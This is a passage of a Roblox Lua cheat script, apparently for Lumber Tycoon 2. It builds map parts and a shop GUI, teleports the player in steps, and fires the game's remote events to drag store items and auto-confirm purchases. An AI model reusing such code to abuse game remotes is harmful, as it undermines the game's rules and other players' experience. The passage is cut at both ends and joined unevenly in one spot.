	Part4.Archivable = true
	Part4.CanCollide = false
	Part4.Locked = false
	Part4.BrickColor = BrickColor.new("Nougat")
	Part4.Material = Enum.Material.Fabric
	Part4.Position = Vector3.new(1201.791015625, -11.89999961853, -382.09997558594)
	Part4.Size = Vector3.new(2048, 0.20000000298023, 2048)
	Part4.Rotation = Vector3.new(0, 90, 0)
	
	local Part5 = Instance.new("Part", Model)
	Part5.Name = "Water4"
	Part5.Reflectance = 0
	Part5.Transparency = 0
	Part5.Anchored = true
	Part5.Archivable = true
	Part5.CanCollide = false
	Part5.Locked = false
	Part5.BrickColor = BrickColor.new("Nougat")
	Part5.Material = Enum.Material.Fabric
	Part5.Position = Vector3.new(-494.96441650391, -11.89999961853, -866.69287109375)
	Part5.Size = Vector3.new(2048, 0.20000000298023, 2048)
	Part5.Rotation = Vector3.new(0, 90, 0)
	
	local Part6 = Instance.new("Part", Model)
	Part6.Name = "Water2"
	Part6.Reflectance = 0
	Part6.Transparency = 0
	Part6.Anchored = true
	Part6.Archivable = true
	Part6.CanCollide = false
	Part6.Locked = false
	Part6.BrickColor = BrickColor.new("Nougat")
	Part6.Material = Enum.Material.Fabric
	Part6.Position = Vector3.new(3233.3588867188, -11.89999961853, -382.09997558594)
	Part6.Size = Vector3.new(2048, 0.20000000298023, 2048)
	Part6.Rotation = Vector3.new(0, 90, 0)
	
	local Part7 = Instance.new("Part", Model)
	Part7.Name = "Water3"
	Part7.Reflectance = 0
	Part7.Transparency = 0
	Part7.Anchored = true
	Part7.Archivable = true
	Part7.CanCollide = false
	Part7.Locked = false
	Part7.BrickColor = BrickColor.new("Nougat")
	Part7.Material = Enum.Material.Fabric
	Part7.Position = Vector3.new(1998.6108398438, -11.89999961853, -2371.4619140625)
	Part7.Size = Vector3.new(2048, 0.20000000298023, 2048)
	Part7.Rotation = Vector3.new(0, 90, 0)
	
	local WedgePart8 = Instance.new("WedgePart", Model)
	WedgePart8.Name = "UP"
	WedgePart8.Reflectance = 0
	WedgePart8.Transparency = 0
	WedgePart8.Anchored = true
	WedgePart8.Archivable = true
	WedgePart8.CanCollide = false
	WedgePart8.Locked = false
	WedgePart8.BrickColor = BrickColor.new("Beige")
	WedgePart8.Material = Enum.Material.Fabric
	WedgePart8.Position = Vector3.new(341.31372070313, -5.8850064277649, -772.25903320313)
	WedgePart8.Size = Vector3.new(65.220001220703, 11.829997062683, 159.52000427246)
	WedgePart8.Rotation = Vector3.new(0, -21.549999237061, 0)
	
	local WedgePart9 = Instance.new("WedgePart", Model)
	WedgePart9.Name = "UP2"
	WedgePart9.Reflectance = 0
	WedgePart9.Transparency = 0
	WedgePart9.Anchored = true
	WedgePart9.Archivable = true
	WedgePart9.CanCollide = false
	WedgePart9.Locked = false
	WedgePart9.BrickColor = BrickColor.new("Beige")
	WedgePart9.Material = Enum.Material.Fabric
	WedgePart9.Position = Vector3.new(384.87704467773, -5.8850121498108, -1050.4354248047)
	WedgePart9.Size = Vector3.new(65.220001220703, 11.829997062683, 155.8099822998)
	WedgePart9.Rotation = Vector3.new(180, -25.35000038147, 180)
	
	local WedgePart10 = Instance.new("WedgePart", Model)
	WedgePart10.Name = "Vol1"
	WedgePart10.Reflectance = 0
	WedgePart10.Transparency = 0
	WedgePart10.Anchored = true
	WedgePart10.Archivable = true
	WedgePart10.CanCollide = false
	WedgePart10.Locked = false
	WedgePart10.BrickColor = BrickColor.new("Medium green")
	WedgePart10.Material = Enum.Material.Fabric
	WedgePart10.Position = Vector3.new(-1133.5314941406, 499.67663574219, 943.49224853516)
	WedgePart10.Size = Vector3.new(39.729999542236, 10.650003433228, 823.29010009766)
	WedgePart10.Rotation = Vector3.new(-32.25, -55.680000305176, -27.529998779297)
	
	local WedgePart11 = Instance.new("WedgePart", Model)
	WedgePart11.Name = "Vol2"
	WedgePart11.Reflectance = 0
	WedgePart11.Transparency = 0
	WedgePart11.Anchored = true
	WedgePart11.Archivable = true
	WedgePart11.CanCollide = false
	WedgePart11.Locked = false
	WedgePart11.BrickColor = BrickColor.new("Medium green")
	WedgePart11.Material = Enum.Material.Fabric
	WedgePart11.Position = Vector3.new(-1526.9182128906, 623.2353515625, 1112.2694091797)
	WedgePart11.Size = Vector3.new(33.96000289917, 10.470000267029, 43.559997558594)
	WedgePart11.Rotation = Vector3.new(0, 32.899997711182, 0)
	
	local WedgePart12 = Instance.new("WedgePart", Model)
	WedgePart12.Name = "Wedge2"
	WedgePart12.Reflectance = 0
	WedgePart12.Transparency = 0
	WedgePart12.Anchored = true
	WedgePart12.Archivable = true
	WedgePart12.CanCollide = false
	WedgePart12.Locked = false
	WedgePart12.BrickColor = BrickColor.new("Medium green")
	WedgePart12.Material = Enum.Material.Fabric
	WedgePart12.Position = Vector3.new(-580.31176757813, 50.62678527832, -2443.0573730469)
	WedgePart12.Size = Vector3.new(58.749996185303, 1, 69.490005493164)
	WedgePart12.Rotation = Vector3.new(-179.08000183105, 14.309999465942, -178.72999572754)
	
	local WedgePart13 = Instance.new("WedgePart", Model)
	WedgePart13.Name = "Wedge"
	WedgePart13.Reflectance = 0
	WedgePart13.Transparency = 0
	WedgePart13.Anchored = true
	WedgePart13.Archivable = true
	WedgePart13.CanCollide = false
	WedgePart13.Locked = false
	WedgePart13.BrickColor = BrickColor.new("Medium green")
	WedgePart13.Material = Enum.Material.Fabric
	WedgePart13.Position = Vector3.new(-554.13073730469, 37.368190765381, -2545.1484375)
	WedgePart13.Size = Vector3.new(59.18998336792, 30.919998168945, 140.86001586914)
	WedgePart13.Rotation = Vector3.new(0.91999995708466, -14.309999465942, -1.2699999809265)
	
	local Part14 = Instance.new("Part", Model)
	Part14.Name = "Wall"
	Part14.Reflectance = 0
	Part14.Transparency = 0.60000002384186
	Part14.Anchored = false
	Part14.Archivable = true
	Part14.CanCollide = true
	Part14.Locked = false
	Part14.BrickColor = BrickColor.new("Medium stone grey")
	Part14.Material = Enum.Material.Fabric
	Part14.Position = Vector3.new(-1522.0369873047, 632.79083251953, 1160.2779541016)
	Part14.Size = Vector3.new(46.590003967285, 8.9700002670288, 1.0400000810623)
	Part14.Rotation = Vector3.new(-180, 60, -180)
	
	local Part15 = Instance.new("Part", Model)
	Part15.Name = "Fence2"
	Part15.Reflectance = 0
	Part15.Transparency = 0.5
	Part15.Anchored = true
	Part15.Archivable = true
	Part15.CanCollide = false
	Part15.Locked = false
	Part15.BrickColor = BrickColor.new("Beige")
	Part15.Material = Enum.Material.Fabric
	Part15.Position = Vector3.new(-620.37908935547, 319.05871582031, 669.19006347656)
	Part15.Size = Vector3.new(2037.669921875, 16.129999160767, 2)
	Part15.Rotation = Vector3.new(0.0099999997764826, 30, -17.510000228882)
	
	local Part16 = Instance.new("Part", Model)
	Part16.Name = "Fence"
	Part16.Reflectance = 0
	Part16.Transparency = 0.5
	Part16.Anchored = true
	Part16.Archivable = true
	Part16.CanCollide = false
	Part16.Locked = false
	Part16.BrickColor = BrickColor.new("Beige")
	Part16.Material = Enum.Material.Fabric
	Part16.Position = Vector3.new(-639.38134765625, 319.06237792969, 636.27484130859)
	Part16.Size = Vector3.new(2037.669921875, 16.129999160767, 2)
	Part16.Rotation = Vector3.new(0.0099999997764826, 30, -17.510000228882)
	        wait(4.6)
    for index, lumber in pairs(game.Workspace.Lumber:GetChildren()) do
   lumber.CanCollide = true
end
end)

TimesFrame = Instance.new("Frame")
TimesFrame.Name = "TimesFrame"
TimesFrame.Parent = MainFrame
TimesFrame.Active = true
TimesFrame.BackgroundColor3 = Color3.new(0, 0, 0)
TimesFrame.BackgroundTransparency = 0.5
TimesFrame.Position = UDim2.new(0, 185, 0, 30)
TimesFrame.Selectable = true
TimesFrame.Size = UDim2.new(0, 200, 0, 145)
TimesFrame.Visible = true

TimesTitle = Instance.new("TextLabel")
TimesTitle.Name = "TimesTitle"
TimesTitle.Parent = TimesFrame
TimesTitle.BackgroundColor3 = Color3.new(1, 0, 0)
TimesTitle.BackgroundTransparency = 0.10000000149012
TimesTitle.Position = UDim2.new(0, 5, 0, 5)
TimesTitle.Size = UDim2.new(0, 190, 0, 20)
TimesTitle.Font = Enum.Font.Fantasy
TimesTitle.Text = "Shop Opening Times"
TimesTitle.TextColor3 = Color3.new(1, 1, 1)
TimesTitle.TextSize = 14

TimeNowTitle = Instance.new("TextLabel")
TimeNowTitle.Name = "TimeNowTitle"
TimeNowTitle.Parent = TimesFrame
TimeNowTitle.BackgroundColor3 = Color3.new(1, 0, 0)
TimeNowTitle.BackgroundTransparency = 1
TimeNowTitle.Position = UDim2.new(0, 5, 0, 25)
TimeNowTitle.Size = UDim2.new(0, 190, 0, 20)
TimeNowTitle.Font = Enum.Font.Fantasy
TimeNowTitle.Text = "-- Current Time: 00:00:00 --"
TimeNowTitle.TextColor3 = Color3.new(1, 1, 1)
TimeNowTitle.TextSize = 14

CarsTitle = Instance.new("TextLabel")
CarsTitle.Name = "CarsTitle"
CarsTitle.Parent = TimesFrame
CarsTitle.BackgroundColor3 = Color3.new(0, 0, 0)
CarsTitle.BorderColor3 = Color3.new(1, 0, 0)
CarsTitle.BackgroundTransparency = 0.69999998807907
CarsTitle.Position = UDim2.new(0, 5, 0, 50)
CarsTitle.Size = UDim2.new(0, 92, 0, 20)
CarsTitle.Font = Enum.Font.Fantasy
CarsTitle.Text = "Boxed Cars"
CarsTitle.TextColor3 = Color3.new(1, 1, 1)
CarsTitle.TextSize = 14

FurnishTitle = Instance.new("TextLabel")
FurnishTitle.Name = "FurnishTitle"
FurnishTitle.Parent = TimesFrame
FurnishTitle.BackgroundColor3 = Color3.new(0, 0, 0)
FurnishTitle.BorderColor3 = Color3.new(1, 0, 0)
FurnishTitle.BackgroundTransparency = 0.69999998807907
FurnishTitle.Position = UDim2.new(0, 5, 0, 75)
FurnishTitle.Size = UDim2.new(0, 92, 0, 20)
FurnishTitle.Font = Enum.Font.Fantasy
FurnishTitle.Text = "Furnishings"
FurnishTitle.TextColor3 = Color3.new(1, 1, 1)
FurnishTitle.TextSize = 14

LinkTitle = Instance.new("TextLabel")
LinkTitle.Name = "LinkTitle"
LinkTitle.Parent = TimesFrame
LinkTitle.BackgroundColor3 = Color3.new(0, 0, 0)
LinkTitle.BorderColor3 = Color3.new(1, 0, 0)
LinkTitle.BackgroundTransparency = 0.69999998807907
LinkTitle.Position = UDim2.new(0, 5, 0, 100)
LinkTitle.Size = UDim2.new(0, 92, 0, 20)
LinkTitle.Font = Enum.Font.Fantasy
LinkTitle.Text = "Link's Logic"
LinkTitle.TextColor3 = Color3.new(1, 1, 1)
LinkTitle.TextSize = 14

OtherShopsNote = Instance.new("TextLabel")
OtherShopsNote.Name = "OtherShopsNote"
OtherShopsNote.Parent = TimesFrame
OtherShopsNote.BackgroundColor3 = Color3.new(1, 0, 0)
OtherShopsNote.BackgroundTransparency = 1
OtherShopsNote.Position = UDim2.new(0, 5, 0, 120)
OtherShopsNote.Size = UDim2.new(0, 190, 0, 20)
OtherShopsNote.Font = Enum.Font.Fantasy
OtherShopsNote.Text = "All Other Shops Are Open 24/7"
OtherShopsNote.TextColor3 = Color3.new(1, 1, 1)
OtherShopsNote.TextSize = 14

FOpenTitle = Instance.new("TextLabel")
FOpenTitle.Name = "FOpenTitle"
FOpenTitle.Parent = TimesFrame
FOpenTitle.BackgroundColor3 = Color3.new(0, 0, 0)
FOpenTitle.BorderColor3 = Color3.new(1, 0, 0)
FOpenTitle.BackgroundTransparency = 0.69999998807907
FOpenTitle.Position = UDim2.new(0, 102, 0, 75)
FOpenTitle.Size = UDim2.new(0, 92, 0, 20)
FOpenTitle.Font = Enum.Font.Fantasy
FOpenTitle.Text = " -- Status --"
FOpenTitle.TextColor3 = Color3.new(1, 1, 1)
FOpenTitle.TextSize = 14

COpenTitle = Instance.new("TextLabel")
COpenTitle.Name = "COpenTitle"
COpenTitle.Parent = TimesFrame
COpenTitle.BackgroundColor3 = Color3.new(0, 0, 0)
COpenTitle.BorderColor3 = Color3.new(1, 0, 0)
COpenTitle.BackgroundTransparency = 0.69999998807907
COpenTitle.Position = UDim2.new(0, 102, 0, 50)
COpenTitle.Size = UDim2.new(0, 92, 0, 20)
COpenTitle.Font = Enum.Font.Fantasy
COpenTitle.Text = " -- Status --"
COpenTitle.TextColor3 = Color3.new(1, 1, 1)
COpenTitle.TextSize = 14

LOpenTitle = Instance.new("TextLabel")
LOpenTitle.Name = "LOpenTitle"
LOpenTitle.Parent = TimesFrame
LOpenTitle.BackgroundColor3 = Color3.new(0, 0, 0)
LOpenTitle.BorderColor3 = Color3.new(1, 0, 0)
LOpenTitle.BackgroundTransparency = 0.69999998807907
LOpenTitle.Position = UDim2.new(0, 102, 0, 100)
LOpenTitle.Size = UDim2.new(0, 92, 0, 20)
LOpenTitle.Font = Enum.Font.Fantasy
LOpenTitle.Text = "-- Status --"
LOpenTitle.TextColor3 = Color3.new(1, 1, 1)
LOpenTitle.TextSize = 14
-- Time

spawn(function()
	while true do 
		TimeNowTitle.Text = "-- Current Time: " .. game.Lighting.TimeOfDay .. " --"
		wait(1)
	end
end)

spawn(function()
	while true do
		if game.Lighting.TimeOfDay > "07:00:00" and game.Lighting.TimeOfDay < "19:00:00" then
			FOpenTitle.Text = "Open"
			FOpenTitle.TextColor3 = Color3.new(0, 255, 0)
			LOpenTitle.Text = "Open"
			LOpenTitle.TextColor3 = Color3.new(0, 255, 0)
		else
			FOpenTitle.Text = "Closed"
			FOpenTitle.TextColor3 = Color3.new(255, 0, 0)
			LOpenTitle.Text = "Closed"
			LOpenTitle.TextColor3 = Color3.new(255, 0, 0)
		end
        wait(1)
	end
end)

spawn(function()
	while true do
		if game.Lighting.TimeOfDay > "08:51:00" and game.Lighting.TimeOfDay < "17:30:00" then
			COpenTitle.Text = "Open"
			COpenTitle.TextColor3 = Color3.new(0, 255, 0)
		else
			COpenTitle.Text = "Closed"
			COpenTitle.TextColor3 = Color3.new(255, 0, 0)
		end
        wait(1)
	end
end)

Buymenu = Instance.new("ImageButton")
Buymenu.Name = "Buymenu"
Buymenu.Parent = Picker
Buymenu.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
Buymenu.BorderColor3 = Color3.new(0, 0, 0)
Buymenu.Position = UDim2.new(0, 15, 0,430)
Buymenu.Size = UDim2.new(0, 80, 0, 80)
Buymenu.ZIndex = 3
Buymenu.Image = "rbxassetid://4892949805"
Buymenu.ScaleType = Enum.ScaleType.Crop
Buymenu.MouseButton1Click:Connect(function()
CurrentItem.Image = "rbxassetid://4892949805"
  makesound("rbxassetid://156785206")
AIntroImage.Visible = false
AIntroImage1.Visible = true
AIntroImage2.Visible = false
AIntroImage3.Visible = false
TimesFrame.Visible = false
end)

BuyFrame = Instance.new("Frame")
BuyFrame.Name = "BuyFrame"
BuyFrame.Parent = MenuFrame
BuyFrame.BorderSizePixel = 1
BuyFrame.BackgroundTransparency = 0.5
BuyFrame.BorderColor3 = Color3.new(0, 0, 0)
BuyFrame.BackgroundColor3 = Color3.new(0, 0, 0)
BuyFrame.Size = UDim2.new(0, 170, 0, 335)
BuyFrame.Visible = false

wrus = Instance.new("TextButton")
wrus.Name = "wrus"
wrus.Parent = BuyFrame
wrus.BackgroundColor3 = Color3.new(0, 0, 0)
wrus.BorderColor3 = Color3.new(1, 0, 0)
wrus.BackgroundTransparency = 0.6
wrus.Position =  UDim2.new(0, 3, 0, 3)
wrus.Size = UDim2.new(0, 164, 0, 20)
wrus.Font = Enum.Font.Fantasy
wrus.Text = "Wood R Us"
wrus.TextColor3 = Color3.new(1, 1, 1)
wrus.TextSize = 14
wrus.MouseButton1Click:connect(function()
BuyFrame.Visible = true
TimesFrame.Visible = false
end)

Buy = Instance.new("TextButton")
Buy.Name = "Buy"
Buy.Parent = BuyFrame
Buy.BackgroundColor3 = Color3.new(0, 0, 0)
Buy.BorderColor3 = Color3.new(1, 0, 0)
Buy.Position =  UDim2.new(0, 85, 0, 141)
Buy.BackgroundTransparency = 0.6
Buy.Size = UDim2.new(0, 82, 0, 20)
Buy.Font = Enum.Font.Fantasy
Buy.Text = "Buy Item"
Buy.TextColor3 = Color3.new(1, 1, 1)
Buy.TextSize = 14
Buy.MouseButton1Click:connect(function()
TimesFrame.Visible = false
BuyFrame.Visible = true
  makesound("rbxassetid://156785206")
end)

function Tlprt(XP,YP,ZP)
-- Config How Many Blocks It Will Tp You Untill The Final Destination:
local XTpEvery = 25
local ZTpEvery = 25
local YTpEvery = 25
--Time to Tp Every:
local Timer = 0.035
--Script:
local pos = game:GetService('Players').LocalPlayer.Character.HumanoidRootPart
if pos.Position.X < XP then
for x = pos.Position.X,XP,XTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(x,pos.Position.Y,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
else
for x = pos.Position.X,XP,-XTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(x,pos.Position.Y,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
end
if pos.Position.Z < ZP then
for z = pos.Position.Z,ZP,ZTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X,pos.Position.Y,z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
else
for z = pos.Position.Z,ZP,-ZTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X,pos.Position.Y,z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
end
if pos.Position.Y < YP then
for High = pos.Position.Y,YP,YTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X ,High ,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
else
for High = pos.Position.Y,YP,-YTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X ,High ,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
end
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(XP,YP,ZP))
end

Buy.MouseButton1Down:connect(function()

local Item = Item.Text
local Quant = Quan.Text

local Base
for i, v in pairs(game.Workspace.Properties:GetChildren()) do
if v.Owner.Value == game.Players.LocalPlayer then
Base = v.OriginSquare
end
end

if not game.ReplicatedStorage:FindFirstChild("Part") then
local a = Instance.new("Part",game.ReplicatedStorage)
game.Workspace.PlayerModels.ChildAdded:connect(function(v)
local BaseC
for i, v in pairs(game.Workspace.Properties:GetChildren()) do
if v.Owner.Value == game.Players.LocalPlayer then
BaseC = v.OriginSquare.CFrame + Vector3.new(0,5,0)
end
end
if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer then
if string.find(v.Name, "Purchased by "..game.Players.LocalPlayer.Name) then
game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.PrimaryPart)
game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(v.PrimaryPart)
wait()
v.PrimaryPart.CFrame = BaseC
wait()
game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.PrimaryPart)
game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(v.PrimaryPart)
end
end
end)
end

if game.Workspace.Stores:FindFirstChild("ShopItems") then
for i,v in pairs(game.Workspace.Stores:GetDescendants()) do
if v.Parent.Name == "ShopItems" then
if v.Name == "Sawmill4L" then
v.Parent.Name = "WoodRUs_"
elseif v.Name == "Pickup1" then
v.Parent.Name = "CarStore_"
elseif v.Name == "LightBulb" then
v.Parent.Name = "FurnitureStore_"
elseif v.Name == "GateXOR" then
v.Parent.Name = "LogicStore_"
elseif v.Name == "CanOfWorms" then
v.Parent.Name = "ShackShop_"
elseif v.Name == "Painting8" then
v.Parent.Name = "FineArt_"
end
end
end
end

function Drag(It)
game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(It)
end

local Cframe
for i,v in pairs(game.Workspace.Stores:GetChildren()) do
if v:FindFirstChild(Item) then
if v.Name == "WoodRUs_" then
for i=1,Quant do
Cframe = game.Workspace.Stores.WoodRUs.Counter
Tlprt(v[Item].Main.Position.X + 3 ,v[Item].Main.Position.Y ,v[Item].Main.Position.Z + 3)
Drag(v[Item])
v[Item].Main.CFrame = Cframe.CFrame
wait(0.1)
Tlprt(v[Item].Main.Position.X + 3 ,v[Item].Main.Position.Y ,v[Item].Main.Position.Z + 3)
wait(0.4)
local A_1 = 
{
	["Character"] = game:GetService("Workspace").Stores.WoodRUs.Thom, 
	["Name"] = "Thom", 
	["ID"] = 11, 
	["Dialog"] = game:GetService("Workspace").Stores.WoodRUs.Thom.Dialog
}
local A_2 = "ConfirmPurchase"
local Event = game:GetService("ReplicatedStorage").NPCDialog.PlayerChatted
Event:InvokeServer(A_1, A_2)
wait(0.1)
end
break
elseif v.Name == "CarStore_" then
Cframe = game.Workspace.Stores.CarStore.Counter
for i=1,Quant do
Tlprt(v[Item].Main.Position.X + 3 ,v[Item].Main.Position.Y ,v[Item].Main.Position.Z + 3)
Drag(v[Item])
v[Item].Main.CFrame = Cframe.CFrame
wait(0.1)
Tlprt(v[Item].Main.Position.X + 3 ,v[Item].Main.Position.Y ,v[Item].Main.Position.Z + 3)
wait(0.4)
local A_1 = 
{
	["Character"] = game:GetService("Workspace").Stores.CarStore.Jenny, 
	["Name"] = "Jenny", 
	["ID"] = 12, 
	["Dialog"] = game:GetService("Workspace").Stores.CarStore.Jenny.Dialog
}
local A_2 = "ConfirmPurchase"
local Event = game:GetService("ReplicatedStorage").NPCDialog.PlayerChatted
Event:InvokeServer(A_1, A_2)
wait(0.1)
end
break
elseif v.Name == "FurnitureStore_" then
Cframe = game.Workspace.Stores.FurnitureStore.Counter
for i=1,Quant do
Tlprt(v[Item].Main.Position.X + 3 ,v[Item].Main.Position.Y ,v[Item].Main.Position.Z + 3)
Drag(v[Item])
v[Item].Main.CFrame = Cframe.CFrame
wait(0.1)
Tlprt(v[Item].Main.Position.X + 3 ,v[Item].Main.Position.Y ,v[Item].Main.Position.Z + 3)
wait(0.4)
local A_1 = 
{
	["Character"] = game:GetService("Workspace").Stores.FurnitureStore.Corey, 
	["Name"] = "Corey", 
	["ID"] = 10, 
	["Dialog"] = game:GetService("Workspace").Stores.FurnitureStore.Corey.Dialog
}
local A_2 = "ConfirmPurchase"
local Event = game:GetService("ReplicatedStorage").NPCDialog.PlayerChatted
Event:InvokeServer(A_1, A_2)
wait(0.1)
end
break
elseif v.Name == "LogicStore_" then
Cframe = game.Workspace.Stores.LogicStore.Counter
for i=1,Quant do
Tlprt(v[Item].Main.Position.X + 3 ,v[Item].Main.Position.Y ,v[Item].Main.Position.Z + 3)
Drag(v[Item])
v[Item].Main.CFrame = Cframe.CFrame
wait(0.1)
Tlprt(v[Item].Main.Position.X + 3 ,v[Item].Main.Position.Y ,v[Item].Main.Position.Z + 3)
wait(0.4)
local A_1 = 
{
	["Character"] = game:GetService("Workspace").Stores.LogicStore.Lincoln, 
	["Name"] = "Lincoln", 
	["ID"] = 15, 
	["Dialog"] = game:GetService("Workspace").Stores.LogicStore.Lincoln.Dialog
}
local A_2 = "ConfirmPurchase"
local Event = game:GetService("ReplicatedStorage").NPCDialog.PlayerChatted
Event:InvokeServer(A_1, A_2)
wait(0.1)
end
break
elseif v.Name == "ShackShop_" then
Cframe = game.Workspace.Stores.ShackShop.Counter
for i=1,Quant do
Tlprt(v[Item].Main.Position.X + 3 ,v[Item].Main.Position.Y ,v[Item].Main.Position.Z + 3)
Drag(v[Item])
v[Item].Main.CFrame = Cframe.CFrame
wait(0.1)
Tlprt(v[Item].Main.Position.X + 3 ,v[Item].Main.Position.Y ,v[Item].Main.Position.Z + 3)
wait(0.4)
local A_1 = 
{
	["Character"] = game:GetService("Workspace").Stores.ShackShop.Bob, 
	["Name"] = "Bob", 
	["ID"] = 13, 
	["Dialog"] = game:GetService("Workspace").Stores.ShackShop.Bob.Dialog
}
local A_2 = "ConfirmPurchase"
local Event = game:GetService("ReplicatedStorage").NPCDialog.PlayerChatted
Event:InvokeServer(A_1, A_2)
wait(0.1)
end
break
elseif v.Name == "FineArt_" then
Cframe = game.Workspace.Stores.FineArt.Counter
for i=1,Quant do
Tlprt(v[Item].Main.Position.X + 3 ,v[Item].Main.Position.Y ,v[Item].Main.Position.Z + 3)
Drag(v[Item])
v[Item].Main.CFrame = Cframe.CFrame
wait(0.1)
Tlprt(v[Item].Main.Position.X + 3 ,v[Item].Main.Position.Y ,v[Item].Main.Position.Z + 3)
wait(0.4)
local A_1 = 
{
	["Character"] = game:GetService("Workspace").Stores.FineArt.Timothy, 
	["Name"] = "Timothy", 
	["ID"] = 14, 
	["Dialog"] = game:GetService("Workspace").Stores.FineArt.Timothy.Dialog
}
local A_2 = "ConfirmPurchase"
local Event = game:GetService("ReplicatedStorage").NPCDialog.PlayerChatted
Event:InvokeServer(A_1, A_2)
wait(0.1)
end
break
end
end
end
Tlprt(Base.Position.X, Base.Position.Y, Base.Position.Z)
end)

Woodrus = Instance.new("ScrollingFrame")
Woodrus.Name = "Woodrus"
Woodrus.Parent = MenuFrame
Woodrus.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Woodrus.BackgroundTransparency = 0.5
Woodrus.Position =  UDim2.new(0, 179, 0, 0)
Woodrus.BorderColor3 = Color3.new(0, 0, 0)
Woodrus.Size = UDim2.new(0, 195, 0, 450)
Woodrus.CanvasPosition = Vector2.new(0,0)
Woodrus.CanvasSize = UDim2.new(0, 0, 0, 696)
Woodrus.Visible = false

PlainAxe = Instance.new("TextButton")
PlainAxe.Name = "PlainAxe"
PlainAxe.Parent = Woodrus
PlainAxe.BackgroundColor3 = Color3.new(0, 0, 0)
PlainAxe.BorderColor3 = Color3.fromRGB(151, 0, 0)
PlainAxe.BackgroundTransparency = 0.6
PlainAxe.Position = UDim2.new(0, 5, 0, 3)
PlainAxe.Size = UDim2.new(0, 173, 0, 20)
PlainAxe.Font = Enum.Font.Fantasy
PlainAxe.Text = "Plain Axe (90)"
PlainAxe.TextColor3 = Color3.new(1, 1, 1)
PlainAxe.TextSize = 14
PlainAxe.MouseButton1Down:connect(function()
Item.Text = "Axe1"
end)

InfoText52 = Instance.new("ImageLabel")
InfoText52.Name = "ImageLabel"
InfoText52.Parent = MainFrame
InfoText52.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText52.BackgroundTransparency = 1
InfoText52.Position = UDim2.new(0, 40, 0, 200)
InfoText52.Size = UDim2.new(0, 100, 0, 100)
InfoText52.Image = "rbxassetid://3818516285"
InfoText52.Visible = false

PlainAxe.MouseEnter:connect(function()
InfoText52.Visible = true
end)

PlainAxe.MouseLeave:connect(function()
InfoText52.Visible = false
end)

BasicHatchet = Instance.new("TextButton")
BasicHatchet.Name = "BasicHatchet"
BasicHatchet.Parent = Woodrus
BasicHatchet.BackgroundColor3 = Color3.new(0, 0, 0)
BasicHatchet.BorderColor3 = Color3.fromRGB(151, 0, 0)
BasicHatchet.BackgroundTransparency = 0.6
BasicHatchet.Position = UDim2.new(0, 5, 0, 26)
BasicHatchet.Size = UDim2.new(0, 173, 0, 20)
BasicHatchet.Font = Enum.Font.Fantasy
BasicHatchet.Text = "Basic Hatchet (12)"
BasicHatchet.TextColor3 = Color3.new(1, 1, 1)
BasicHatchet.TextSize = 14
BasicHatchet.MouseButton1Down:connect(function()
Item.Text = "BasicHatchet"
end)

InfoText53 = Instance.new("ImageLabel")
InfoText53.Name = "ImageLabel"
InfoText53.Parent = MainFrame
InfoText53.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText53.BackgroundTransparency = 1
InfoText53.Position = UDim2.new(0, 40, 0, 200)
InfoText53.Size = UDim2.new(0, 100, 0, 100)
InfoText53.Image = "rbxassetid://3818561662"
InfoText53.Visible = false

BasicHatchet.MouseEnter:connect(function()
InfoText53.Visible = true
end)

BasicHatchet.MouseLeave:connect(function()
InfoText53.Visible = false
end)

StealAxe = Instance.new("TextButton")
StealAxe.Name = "StealAxe"
StealAxe.Parent = Woodrus
StealAxe.BackgroundColor3 = Color3.new(0, 0, 0)
StealAxe.BorderColor3 = Color3.fromRGB(151, 0, 0)
StealAxe.BackgroundTransparency = 0.6
StealAxe.Position = UDim2.new(0, 5, 0, 49)
